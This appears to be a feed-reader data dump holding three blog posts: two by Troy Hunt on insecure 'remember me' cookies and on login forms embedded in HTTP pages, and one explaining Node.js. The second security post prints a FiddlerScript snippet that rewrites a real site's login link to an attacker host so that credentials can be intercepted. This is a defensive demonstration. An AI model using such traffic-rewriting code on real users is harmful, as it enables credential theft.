border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=Awt1njA8rQU:7Gti5R8zH_4:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=Awt1njA8rQU:7Gti5R8zH_4:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=Awt1njA8rQU:7Gti5R8zH_4:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=Awt1njA8rQU:7Gti5R8zH_4:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=Awt1njA8rQU:7Gti5R8zH_4:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/Awt1njA8rQU\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1216}}
{"k":"0000000084","o":"0000024857","v":"001"}
{"_id":1217,"_uid":1217,"_dt":1373742620962,"_s":"fed3623009320b7b01cead41e4afd597"}
{"subscription":{"$wrap":"$oid","v":57},"link":"http://feedproxy.google.com/~r/TroyHunt/~3/8M6Zs6dCWn8/how-to-build-and-how-not-to-build.html","title":"How to build (and how not to build) a secure “remember me” feature","published":{"$wrap":"$date","v":1372669440001,"h":"2013-07-01T09:04:00.001Z"},"starred":false,"read":false,"content":"<p>Here’s the scenario – a user logs in to your website, comes back tomorrow and… has to log in again. The idea of the “remember me” feature – and let’s face it, we’ve all seen this before – is that their authenticated state is persisted beyond the immediate scope of use. What this means is that they can close the browser, turn off the PC then come back tomorrow or next week or next month or however much later you determine is a reasonable timeframe and the site still knows who they are and offers them all the same features they had when they left it.</p><p>I’m talking about this little guy here:</p><p><img width=\"462\" height=\"82\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"\"Keep me logged in\" from Facebook\" src=\"http://lh4.ggpht.com/-JHWNglBmUDo/UdFF-IW2fwI/AAAAAAAAFbs/VFVvfJmNXbo/image31.png?imgmax=800\" border=\"0\"></p><p>Seems easy, right? It can be, but as you’ll see it’s also not uncommon to make an absolute mess of it and even when you do get it right, there’s a queue of people ready to tell you how it is, in fact, not quite right enough. Let’s start with the<em>really</em>wrong stuff and work from there.</p><a name='more'></a><h4>Anti-patterns</h4><p>This seems obvious, right? I mean the implementation of a “remember me” feature is pretty fundamental, not the sort of thing easily gotten wrong, surely? Apparently not.</p><p>Let me share two anti-patterns and we’ll discuss the problems with them before talking about how to do it right. The first example comes courtesy of Black& Decker, that would be the same B&D I recently wrote about in<a href=\"http://www.troyhunt.com/2013/05/security-is-hard-insecurity-is-easy.html\">Security is hard, insecurity is easy</a>. Here’s the idea when you login:</p><p><img width=\"488\" height=\"285\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Logging in to Black& Decker\" src=\"http://lh5.ggpht.com/-wvgqafGAVEU/UdFF-1kwgAI/AAAAAAAAFb0/r7vYPJJfcM8/image5.png?imgmax=800\" border=\"0\"></p><p>That’s all pretty standard, the interesting bit comes after you log in. Let’s take a look at the cookies:</p><p><img width=\"798\" height=\"332\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Black& Decker cookies\" src=\"http://lh5.ggpht.com/-eP31JfR5TiQ/UdFF_gwV6qI/AAAAAAAAFb8/pcnOHLUp0IM/image2.png?imgmax=800\" border=\"0\"></p><p>This is a fairly impressive set of cookies but it’s the highlighted ones that are genuinely interesting. These cookies won’t get set if you don’t check the “remember me” box so their function is purely to log you back in later on. My email address is pretty clearly in there, but that’s not my password, instead it appears to be some sort of impenetrable fortress of cryptographic… hang on – that’s Base64 encoding! The thing about Base64 encoding is that it’s neatly complemented by Base64<em>de</em>coding which means that you can head off to somewhere like<a href=\"http://www.base64decode.org\">base64decode.org</a>and do this:</p><p><img width=\"514\" height=\"313\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Base 64 decoding the Black& Decker cookie\" src=\"http://lh3.ggpht.com/-aQZzH2NHr6c/UdFGASLoJQI/AAAAAAAAFcE/bxNThlU8CnQ/image8.png?imgmax=800\" border=\"0\"></p><p>Now not everyone uses Base64 as a means of “cryptography” (yes,<a href=\"http://www.troyhunt.com/2013/01/the-problem-with-website-security-is-us.html\">some people do genuinely do this</a>) and indeed it’s a perfectly legitimate means of representing data in an ASCII format, the real story here however is that this is my password sitting there in my browser in plain text. You may wonder – why is this a problem? It’s in your own browser, right? How does an attacker get it?</p><p>I’m going to talk about two very easy ways and the first relates to the earlier link about insecurity being easy. Black& Decker had exposed ELMAH logs and in those logs was every unhandled internal server exception, somewhere north of 50,000 of them at the time I reported it to them. When ELMAH logs an exception it also logs all the request headers which means the<em>cookies</em>are logged. Combine that with the huge number of unhandled exceptions being thrown by the system and now you have a treasure trove of user credentials. Yes, they should have secured their ELMAH log properly to begin with but it’s a good example of how you can be very easily undone by one very simple misconfiguration.</p><p>Here’s another one:</p><p><img width=\"250\" height=\"378\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Logging in to Aussie Farmers Direct\" src=\"http://lh3.ggpht.com/-0MQkqGmrVW8/UdFGBK_Z0QI/AAAAAAAAFcM/7HqbqOyYEEM/image311.png?imgmax=800\" border=\"0\"></p><p>This is<a href=\"https://orders.aussiefarmers.com.au\">Aussie Farmers Direct</a>and it’s a fairly typical looking log in form. Let’s log in, tell it to “remember me” then take a look at the cookies:</p><p><img width=\"796\" height=\"139\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Aussie Farmers Direct cookies\" src=\"http://lh5.ggpht.com/-5OyfmaliDfc/UdFGB70cl0I/AAAAAAAAFcU/kFUtgoBKXrk/image91.png?imgmax=800\" border=\"0\"></p><p>Oh dear, same deal again but without any Base64 encoding. Actually this one is particularly bad because you can do stuff like this:</p><p><img width=\"476\" height=\"37\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Improperly encoded cookie on Aussie Farmers Direct\" src=\"http://lh5.ggpht.com/-HMSOuv66vcg/UdFGCsHlkYI/AAAAAAAAFcc/0emkrm4pDqQ/image18.png?imgmax=800\" border=\"0\"></p><p>XSS your own JSON cookie? Sure! The other idiosyncrasy is that changing your password doesn’t change the cookie so you come back to the site later on and it tries to log you in with the old one. Oops.</p><p>Aussie Farmers Direct doesn’t have exposed ELMAH logs (being PHP kind of helps with that!) but they do have other risks such as XSS (incidentally, this has been responsibly disclosed and the risk summarily dismissed – multiple times). The other thing about both the sites above is that those cookies holding the passwords aren’t flagged as HttpOnly, you can see this in the second column from the right in the cookie lists. What this means is that client script can access those cookies which means that if you can get a piece of XSS onto the site – just as you can on the Aussie Farmers site – you can steal cookies containing passwords if you can get a customer to load the XSS payload (and there are numerous ways of doing that). The missing HttpOnly attribute is sloppy on behalf of both sites, but the core of the issue is storing passwords in cookies which then makes them vulnerable via other oversights.</p><p>There’s one more fundamentally important reason why both these practices are negligent; they’re protecting customers’ credentials used on other sites. Every time a customer using the “remember me” feature on one of the sites above makes a request, there’s a very good chance they’re sending the username and password to their email, their eBay or their bank across the wire, sometimes in plain text, sometimes accessible via client script, always sitting there unprotected in the browser.<a href=\"http://www.troyhunt.com/2012/07/what-do-sony-and-yahoo-have-in-common.html\">Password reuse is rampant</a>and whilst those damn users should take some bloody responsibility (I’m paraphrasing here!), we – as developers –<em>must</em>acknowledge that we’re protecting far more than just our own site when we handle credentials.</p><p>So that should establish that there is a genuine misunderstanding of how the “remember me” feature<em>should</em>be built, let’s now move onto the good practices.</p><h4>A sample reference implementation</h4><p>One of the mantras you frequently hear in the security world is “Don’t roll your own – use what’s already been proven to be robust”. This is very frequently applied to encryption and authentication schemes but in this case we can extend this to the “remember me” feature in order to start with a good reference implementation before we delve into the details.</p><p>In a new ASP.NET MVC 4 website provisioned with Visual Studio 2012 you get this right out of the box:</p><p><img width=\"352\" height=\"338\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Logging in to a sample ASP.NET application\" src=\"http://lh3.ggpht.com/-T6wJXCWtnpQ/UdFGDJgd8iI/AAAAAAAAFck/vaA2S0PkYic/image31%25255B1%25255D.png?imgmax=800\" border=\"0\"></p><p>Other frameworks have other standard modes of implementing this feature but this is an easy one for me to refer to. When we login with the fields as above (i.e. not asking it to remember me), successful authentication results in the following cookie being returned:</p><pre>Set-Cookie:.ASPXAUTH=6891A5EAF17A9C35B51C4ED3C473FBA294187C97B758880F9A56E3D335E2F020B86A85E1D0074BDAB2E1C9DBE590AF67895C0F989BA137E292035A3093A702DEC9D0D8089E1D007089F75A77D1B2A79CAA800E8F62D3D807CBB86779DB52F012; path=/; HttpOnly</pre><p>This is simply an auth cookie and in the stateless world that is HTTP it’s the one little piece of data that ties all the otherwise entirely independent requests from one person together. Each time this unique-to-me cookie is sent, the website knows it’s me and that I’ve already authenticated. We can see it bit more clearly when we look at it in Chrome’s Cookies collection:</p><p><img width=\"794\" height=\"56\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Cookies from a sample ASP.NET application without the\"remember me\" box checked\" src=\"http://lh3.ggpht.com/-8rKwUf_wQtk/UdFGDifnEmI/AAAAAAAAFcs/HrHn4wNix-s/image6.png?imgmax=800\" border=\"0\"></p><p>Incidentally, the second cookie is an anti-forgery token to prevent CSRF attacks and has nothing to do with our authenticated state. Other than that, there are no other cookies.</p><p>Let’s now log in and ask the site to remember me, here’s the cookie response:</p><pre>Set-Cookie:.ASPXAUTH=3A92DAC7EFF4EE5B2027A13DD8ABEA8254F0A16D8059FCAF60F5533F1B7D99462DDF57320D069A493481978750526DF952D5C9EA0371C84F5CF1BFC0CCA024C2052824D4BA09670A42B85AEC7FFCB4088FC744C6C0A22749F07AF6E65E674A4A; expires=Tue, 02-Jul-2013 00:27:05 GMT; path=/; HttpOnly</pre><p>Aha – you see that?! It becomes clearer when you see it broken down in Chrome:</p><p><img width=\"794\" height=\"55\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Cookies from a sample ASP.NET application with the\"remember me\" box checked\" src=\"http://lh5.ggpht.com/-BunTDUP-fbA/UdFGELSz1cI/AAAAAAAAFc0/NobvT62lNJA/image9.png?imgmax=800\" border=\"0\"></p><p>We now have a cookie expiration which is 48 hours from now as opposed to having no cookie expiration which means it will be discarded when the browser is closed. Let’s take a closer look at that.</p><h4>Looking at auth cookie expiration</h4><p>This is actually a ridiculously easy security construct and it’s only in light of the earlier examples that I’d even think it worth writing about, but here we are. In this implementation, the “remember me” feature simply boils down to when the auth cookie expires because what you’re really doing here is controlling how long you want someone to stay logged on for, it’s that simple.</p><p>In the example above, ASP.NET defaults to using a session cookie or in other words, a cookie that does not have an explicit expiration date and will therefore forcibly expire when the browser is closed. That’s one approach, another is to explicitly set a short expiration period so that even if the browser is left open the user will be automatically logged out after a period of time. Of course you can also control this behaviour on the server and you can also keep extending the lifetime of an auth cookie if the system is being actively used by the server increasing the expiration date on response.</p><p>Remembering someone can be as simple as keeping that auth cookie alive. How long should it be kept alive for? The example above defaults to two days which is probably a bit short for many legitimate uses of the feature (although it’s easily configurable in ASP.NET), try Facebook though and you’ll get cookies that last for a year. Shorter duration means less risk but more inconvenience, longer duration makes it easier for the user but increases the window of potential attack. Let’s take a look at that risk in more detail.</p><h4>Exploiting long-running authentication state</h4><p>While you are not authenticated, your session can’t be hijacked. I know, insightful stuff! But seriously, take a case like Aussie Farmers Direct above; that cookie will expire in six months and combined with the fact that it’s not flagged as HTTP only and that they have XSS flaws in the site there’s now half a year window where just following a link could cause me to inadvertently hand over my credentials to an attacker. If that period was, say, one month yes, they’d still have some serious flaws in their design but then the window of opportunity for an attacker has just been slashed.</p><p>On the other hand, Black& Decker has a relative short one week expiration period so in their case with the exposed ELMAH logs, yes, there was a series of bad failures on their part but unless someone had logged in with the “remember me” box ticked in the last week<em>and</em>caused an unhandled exception, the credentials wouldn’t be put on public display. Ok, if you’re on the site to begin with there’s a good chance you’re already logged in (at least compared to the Farmers example where you wouldn’t have to consciously go anywhere near the site to lose your password) but you can see how that risk profile changes with the cookie expiration period.</p><p>Of course underlying all this is that the auth cookie needs to be carefully protected; HttpOnly and secure attributes are an absolute must. All your classic hijacking threats remain relevant but then again, however you slice and dice this feature you’re going to end up with a cookie dependency therefore you’re going to need to watch those cookies very, very carefully.</p><p>Ultimately it’s a trade-off that needs to consider factors such as the value to an attacker of the user’s data on the site, the barrier that<em>not</em>being authenticated poses to a returning user and the security profile of the rest of the site. For example, Facebook has some very useful data of a social nature and users expect a low-friction (even<em>no</em>-friction) process when returning, plus they’ve made<em>massive</em>investments in their security profile. Aussie Farmer’s, on the other hand, holds personally identifiable user data plus financial info whilst providing a service that people<em>expect</em>to authenticate to (payment facilities) yet have little understanding of important security concepts. They’re very different risk profiles and they<em>should</em>be very different auth cookie expiration strategies.</p><h4>Strengthening the approach</h4><p>There will be folks who look at the auth cookie approach and roll their eyes in despair. The thing about security is that there’s always a better way depending on the time / money / complexity you’re willing to add and there’s also always someone ready to tell you you’ve got it wrong! Using the auth cookie expiration as a starting point, let’s look at some possible ways of strengthening the approach.</p><p>One argument against long expiration of auth cookies is that they’re effectively keeping the user authenticated and at risk of attacks such as CSRF or clickjacking. Of course the application needs to exhibit other risks in order for an attacker to capitalise on the long lasting cookie but the whole defence in depth argument comes up again. An alternative is to have a dedicated cookie keyed against the user which after validating the authenticity of it with the server, can then initiate a new authenticated session on their return. The original session can then expire quickly, the trick is to re-instate a new one when the user comes back with the dedicated “remember me” cookie and include some additional validation in the process.</p><p>One way of providing additional validation is by including the user’s IP address / user agent / other distinguishing feature in the “remember me” cookie. The rationale is that this offers some defence against hijacking of the cookie. The problem, of course, is that there are legitimate use cases where these change. In the mobile world in particular it’s not uncommon to return to a site with a different IP. Even in the world of physical connections you can’t necessarily rely on the ISP providing a static IP address. As for user agents, with browsers like Chrome and Firefox updating at what seems like every other day, unless you’re a bit selective about<em>what</em>attributes of the user agent string you’re storing and comparing that’s going to be a risky approach. The same defences around using unique user attributes to and add security are often discussed in the context of session and auth cookies and whilst I’m sure there are valid use cases for this (back to banking again), I can’t say I’ve actually seen it in place in any of the sites I’ve tested before. There’s probably a good reason for that…</p><p>A more pragmatic mitigation is to still separate the auth cookie from a dedicated “remember me” cookie and use the latter to re-authenticate the user<em>but impose some restrictions</em>. The reality is that the process of automatically persisting someone’s authenticated state – through whatever means – introduces compromises to the security model. A mitigation would be to require an automatically re-authenticated user to expressly provide their credentials again before viewing certain classes of data or performing certain activities. This is not unheard of even outside the scope of “remember me”, you might see it when performing high-value activities such as a bank transfer. In this case, we’re saying that the authenticated user is at greater risk because there’s more likelihood that they’re not who they say they are (i.e. someone else has sat down at the PC and effectively highjacked a session).</p><p>The other hardening we can apply to this approach is to ensure that the cookie used to remember the user is reset after it has been used. This also means invalidating it on the server side so there needs to be both uniqueness and persistence of the cookie value, for example a nonce persisted in both the database and the cookie. This has the benefit of ensuring that if the cookie<em>is</em>obtained by an attacker it has only has a single use scope – and that’s if the user can’t legitimately use it before them. There’s a good little article<a href=\"http://jaspan.com/improved_persistent_login_cookie_best_practice\">here</a>which talks about some mitigations to this pattern and again, there are use cases where this can be beneficial but you are going to invest additional effort building it and there are cases where it will inconvenience legitimate users (i.e. trying to remember yourself on the same site across multiple PCs).</p><p>The last thing worth mentioning is that the same account management principles that need to be considered for active authenticated sessions are relevant in the “remember me” context. For example, are multiple simultaneously authenticated sessions allowed from the one user? If the user changes their password will it disconnect the other sessions? Can an administrator end the authenticated session? There are all sorts of issues that come up that are<em>really</em>part of the discussion on how authenticated sessions are verified and managed, the discussion here is merely about how to reinstate that.</p><h4>When shouldn’t you allow “remember me”? (and some middle-ground alternatives)</h4><p>Sometimes it simply<em>never</em>makes sense to allow an authenticated user to remain authenticated for long periods of time. Banking, for example, is the stereotypical use case for when you want to force re-authentication as soon as possible as the risks are just too significant to leave unused authenticated browser sessions lying around the place.</p><p>But there is actually some middle ground that can be taken here:</p><p><img width=\"240\" height=\"278\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"A\"remember me\" box on the American Express website\" src=\"http://lh4.ggpht.com/-utZn1CP4eZM/UdFGEmoMc9I/AAAAAAAAFc8/Lh20wkoe09Y/image12.png?imgmax=800\" border=\"0\"></p><p>This is not entirely what it looks like – when you come back after an expired session where you asked the site to “Remember Me”, you’ll get this:</p><p><img width=\"241\" height=\"280\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"The American Express website pre-populating the username on return\" src=\"http://lh6.ggpht.com/-4s1S1UF2cYQ/UdFGFMBkHXI/AAAAAAAAFdE/4NdTjBkR_rM/image15.png?imgmax=800\" border=\"0\"></p><p>I’ve not obfuscated the username, the username as it appears above with the stars are stored in a cookie that lasts for three months along with some other data that inevitably identifies the user. Frankly, I don’t see a lot of value in this, remembering your username isn’t usually the problem!</p><p>But it also doesn’t have to be all or nothing, there’s middle ground. For example, the point I made earlier about re-authenticating before key processes are performed if the session had been resumed by a “remember me” feature. It’s a bit of the best of both worlds.</p><h4>In conclusion…</h4><p>This is one of those features that seems like a good idea at the time (and<em>sometimes</em>it is) and it’s usually very easy to get right, at least<em>sufficiently</em>right for most purposes. Frankly, it’s still a little baffling how wrong the two earlier examples got it particularly when you consider that it would have been sufficient to just extend the lifetime of the cookie they already have!</p><p>The other point to take away from this post beyond just the mechanics of the “remember me” feature is how security is such a multi-tiered, inter-dependent beast. You might be able to get away with credentials in cookies by themselves, but combine that with the ELMAH situation or missing HTTP only attributes and XSS flaws and suddenly a foolish albeit relatively innocuous practice becomes a serious risk. What was that about “defence in depth” again?!</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/8M6Zs6dCWn8\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1217}}
{"k":"0000000084","o":"0000005491","v":"001"}
{"_id":1218,"_uid":1218,"_dt":1373742620962,"_s":"1244cba156600a4a1b72b8e63d6bc122"}
{"subscription":{"$wrap":"$oid","v":57},"link":"http://feedproxy.google.com/~r/TroyHunt/~3/9Xh_TORUFQ8/the-security-futility-that-is-embedding.html","title":"The security futility that is embedding secure login forms within insecure pages","published":{"$wrap":"$date","v":1372064160001,"h":"2013-06-24T08:56:00.001Z"},"starred":false,"read":false,"content":"<p>I’ve been writing a bunch of content around HTTPS lately and recording videos to demonstrate the ease with which insecure implementations of SSL can be broken. For example, there was the piece on<a href=\"http://www.troyhunt.com/2013/05/heres-why-you-cant-trust-ssl-logos-on.html\">why you can’t trust SSL logos</a>, then how<a href=\"http://www.troyhunt.com/2013/05/your-login-form-posts-to-https-but-you.html\">loading login forms over HTTP but posting to HTTPS is pointless</a>and most recently, why those<a href=\"http://www.troyhunt.com/2013/06/understanding-risk-of-mixed-content.html\">mixed content warnings mean easy pickings for attackers on the transport layer</a>. All of these involve working demonstrations against real sites who just don’t quite get HTTPS.</p><p>Today’s example is about what happens when a login page is loaded securely, albeit embedded within an insecure page. This is a common security anti-pattern and you’ll see it on many sites. The example in the video is from<a href=\"http://www.countdown.co.nz/\">Countdown in New Zealand</a>but again, there are countless others out there. Take a look at the video then I’ll come back to how I mounted the attack:</p><iframe width=\"100%\" height=\"480\" src=\"http://www.youtube.com/embed/Ma9uxvXv_00?feature=player_embedded\" frameborder=\"0\" allowfullscreen=\"\"></iframe><p>Make sense? In short, you can never trust the HTTP component of the communication and without the ability to see the URL in the browser<em>loaded over an HTTPS address with a valid certificate</em>, the SSL implementation is almost useless.</p><a name='more'></a><p>The mechanics of how I’ve demonstrated attacks against insufficient use of SSL involves using<a href=\"http://fiddler2.com/documentation/KnowledgeBase/FiddlerScript/ModifyRequestOrResponse\">Fiddler script</a>. Many of you may already be familiar with<a href=\"http://fiddler2.com/\">Fiddler</a>, the scripting option gives us the ability to manipulate unencrypted traffic on the wire just as an attacker might at any point in the network communication. Clearly an attacker at, say an ISP or running a rogue wireless hotspot wouldn’t be running Fiddler, but the mechanics of manipulating requests and responses is similar with other tools.</p><p>In this example I simply added the following script in the OnBeforeResponse event:</p><pre class=\"code\"><span style=\"color: blue\">if</span><span style=\"color: gray\">(</span><span style=\"color: black\">oSession</span><span style=\"color: gray\">.</span><span style=\"color: black\">HostnameIs</span><span style=\"color: gray\">(</span><span style=\"color: maroon\">\"www.countdown.co.nz\"</span><span style=\"color: gray\">)&&</span><span style=\"color: black\">oSession</span><span style=\"color: gray\">.</span><span style=\"color: black\">PathAndQuery</span><span style=\"color: gray\">==</span><span style=\"color: maroon\">\"/\"</span><span style=\"color: gray\">) {<br></span><span style=\"color: green\">// Remove any compression or chunking<br></span><span style=\"color: black\">oSession</span><span style=\"color: gray\">.</span><span style=\"color: black\">utilDecodeResponse</span><span style=\"color: gray\">();<br><br></span><span style=\"color: blue\">var</span><span style=\"color: black\">oBody</span><span style=\"color: gray\">=</span><span style=\"color: black\">System</span><span style=\"color: gray\">.</span><span style=\"color: black\">Text</span><span style=\"color: gray\">.</span><span style=\"color: black\">Encoding</span><span style=\"color: gray\">.</span><span style=\"color: black\">UTF8</span><span style=\"color: gray\">.</span><span style=\"color: black\">GetString</span><span style=\"color: gray\">(</span><span style=\"color: black\">oSession</span><span style=\"color: gray\">.</span><span style=\"color: black\">responseBodyBytes</span><span style=\"color: gray\">);<br><br></span><span style=\"color: green\">// Change the path of the login form<br></span><span style=\"color: black\">oBody</span><span style=\"color: gray\">=</span><span style=\"color: black\">oBody</span><span style=\"color: gray\">.</span><span style=\"color: black\">replace</span><span style=\"color: gray\">(</span><span style=\"color: maroon\">\"/onecard/panels/customer-login\"</span><span style=\"color: gray\">,</span><span style=\"color: maroon\"><br>\"http://hackyourself.troyhunt.com/Countdown\"</span><span style=\"color: gray\">);<br><br></span><span style=\"color: green\">// Set the response body to the changed body string<br></span><span style=\"color: black\">oSession</span><span style=\"color: gray\">.</span><span style=\"color: black\">utilSetResponseBody</span><span style=\"color: gray\">(</span><span style=\"color: black\">oBody</span><span style=\"color: gray\">);<br>}</span></pre><p>In other words, when the homepage is loaded simply replace the link to the login form from the original one to the attacker’s one that looks the same. Job done.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/9Xh_TORUFQ8\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1218}}
{"k":"0000000084","o":"0000006550","v":"001"}
{"_id":1219,"_uid":1219,"_dt":1373742620963,"_s":"27c212ca864cbfc895a1c45f47d2dcdd"}
{"subscription":{"$wrap":"$oid","v":55},"link":"http://feedproxy.google.com/~r/davybrion/~3/AsPaZvBN6HA/","title":"Node.js For Dummies","published":{"$wrap":"$date","v":1324230039000,"h":"2011-12-18T17:40:39.000Z"},"starred":false,"read":false,"content":"<p>I'm sure you've all heard of Node.js by now. Its popularity is increasing rapidly, which means it's a good idea to be aware of what Node.js is and especially how it differs from more traditional technology stacks. In this post, I'll try to give an easy-to-understand overview of what makes Node.js different and make it clear that it's more than just server-side JavaScript. Note that this overview is highly simplified and only meant to help people understand how Node.js works. This is definitely not a completely accurate description of the lower-level details of Node.js.</p><h2>Evented/Asynchronous I/O</h2><p>In most technology stacks, API calls for I/O operations are synchronous. As in, the thread that executes the operation is blocked for the duration of the I/O operation until that operation has completed. Once completed, execution of your code proceeds. Of course, a lot of technology stacks have asynchronous variants of those operations available as well, but generally speaking, they aren't used as often as the synchronous variants. In Node.js, it's the other way around. All I/O operations are asynchronous and there are only a few synchronous implementations available (and you're generally discouraged from using them).</p><p>This means that whenever you do an I/O operation (file manipulation, network requests, database operations, etc…), Node.js initiates the I/O operation through a lower-level C/C++ layer which will perform the operation asynchronously. Once the operation has completed, Node.js will execute your callback function that you passed as a parameter to the I/O operation's function call. The important thing here is that while the I/O operation is being executed, Node.js doesn't have to wait for the operation to complete, and is able to focus entirely on processing other events. And those events can be anything: incoming network requests, executing callbacks from other operations that have completed, or invoking whatever function that is assigned to a particular event.</p><h2>Eventloop</h2><p>The Node.js eventloop is what makes Node.js so interesting and powerful. Node.js basically just keeps reading from an event queue until that queue is empty. As it loops through the events to be processed, it invokes the JavaScript functions that have been assigned for those events. If any of those functions performs an I/O operation, Node.js will initiate the operation and then immediately move to the next event in the event queue. Once the I/O operation has completed, an event will be added to the event queue with a reference to your original callback. Once all preceding events have been processed, Node.js will get to the newly added event and invoke your callback. Because all I/O operations are asynchronous, this enables Node.js to maximize its efficiency as it processes events because it doesn't need to wait for slow I/O operations to complete.</p><h2>Single-threaded</h2><p>One thing that people don't always realize is that the Node.js eventloop is single-threaded. This has some nice benefits but there's a huge drawback as well. The biggest benefit is that you don't need to worry about concurrent access to shared state. After all, there is never more than 1 thread executing your JavaScript functions. This means you don't have to write any locking code to protect shared state. The drawback to the single-threaded eventloop is that you need to be careful not to block the event loop. If you're planning on doing heavy synchronous processing in your JavaScript code, you need to realize that no other events can be processed by Node.js until that synchronous block of code has completed. Obviously, since there's only one thread going through the eventloop, any delay you cause in your code can be very costly to overall throughput and performance. For now, it's best to execute synchronous processing routines as a child process, possibly even in a language that is more suitable for this than JavaScript. But it seems that future Node.js versions will provide a more integrated way to deal with this.</p><h2>Why JavaScript?</h2><p>JavaScript's support of closures and it treating functions as first class objects means it's ideally suited for the evented programming model that Node.js offers. Many people still think of JavaScript as a joke or a toy language, but it's a lot more powerful than many people think it is. Yes, it certainly has problems as well, but it's definitely worth learning. I do hope that this post has made it clear that there's a lot more to Node.js than simply being server-side JavaScript. What makes Node.js so interesting are the principles that I've tried to explain in this post. Those principles can be implemented with other languages as well, and could be made to work just as great as, or perhaps even greater than Node.js itself. But you'd be hard-pressed to find a language that's so ubiquitous, yet completely devoid of a pre-existing synchronous I/O infrastructure.</p><p>Anyways, I hope I succeeded at making it somewhat clear how Node.js works and why it's so different from most other technology stacks.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=AsPaZvBN6HA:0t_GLmgkIK8:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=AsPaZvBN6HA:0t_GLmgkIK8:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=AsPaZvBN6HA:0t_GLmgkIK8:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=AsPaZvBN6HA:0t_GLmgkIK8:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=AsPaZvBN6HA:0t_GLmgkIK8:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=AsPaZvBN6HA:0t_GLmgkIK8:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=AsPaZvBN6HA:0t_GLmgkIK8:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=AsPaZvBN6HA:0t_GLmgkIK8:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/AsPaZvBN6HA\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1219}}
{"k":"0000000084","o":"0000006041","v":"001"}
{"_id":1220,"_uid":1220,"_dt":1373742620963,"_s":"1b483ac98065383b011c61d5681f2b86"}
